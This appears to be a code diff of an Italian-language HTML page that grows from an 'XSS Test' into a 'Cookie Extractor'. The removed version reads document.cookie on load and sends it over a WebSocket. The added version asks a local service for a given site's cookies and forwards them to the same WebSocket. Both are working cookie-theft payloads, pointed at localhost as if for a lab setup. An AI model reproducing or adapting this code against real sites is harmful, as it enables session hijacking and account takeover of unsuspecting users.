@@ -1,32 +1,63 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
     <meta charset="UTF-8">
-    <title>XSS Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Estrattore di Cookie</title>
 </head>
 <body>
+    <h1>Estrattore di Cookie</h1>
     <script>
-        // Inizializza la connessione WebSocket
-        const ws = new WebSocket('ws://localhost:8080');
+        // Funzione per ottenere i parametri di query
+        function getQueryParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                url: params.get('url')
+            };
+        }
 
-        ws.onopen = () => {
-            console.log('WebSocket connection opened');
-            // Ottieni i cookie e inviali al server tramite WebSocket
-            const cookies = document.cookie;
-            ws.send(cookies);
-        };
+        // Funzione per inviare i cookie tramite WebSocket
+        function sendCookiesViaWebSocket(cookies) {
+            const ws = new WebSocket('ws://localhost:8080');
 
-        ws.onmessage = (event) => {
-            console.log('Message from server:', event.data);
-        };
+            ws.onopen = () => {
+                console.log('WebSocket connection opened');
+                ws.send(cookies);
+            };
 
-        ws.onerror = (error) => {
-            console.error('WebSocket error:', error);
-        };
+            ws.onmessage = (event) => {
+                console.log('Message from server:', event.data);
+            };
 
-        ws.onclose = () => {
-            console.log('WebSocket connection closed');
-        };
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+            };
+
+            ws.onclose = () => {
+                console.log('WebSocket connection closed');
+            };
+        }
+
+        // Ottieni i parametri di query
+        const queryParams = getQueryParams();
+        const url = queryParams.url;
+
+        if (!url) {
+            alert('URL mancante nel parametro di query.');
+        } else {
+            fetch(`http://localhost:3000/get-cookies?url=${encodeURIComponent(url)}`)
+                .then(response => response.json())
+                .then(data => {
+                    const cookies = JSON.stringify(data);
+                    alert('Cookies: ' + cookies);
+                    console.log('Cookies:', cookies);
+                    sendCookiesViaWebSocket(cookies);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    alert('Error fetching cookies: ' + error);
+                });
+        }
     </script>
 </body>
 </html>
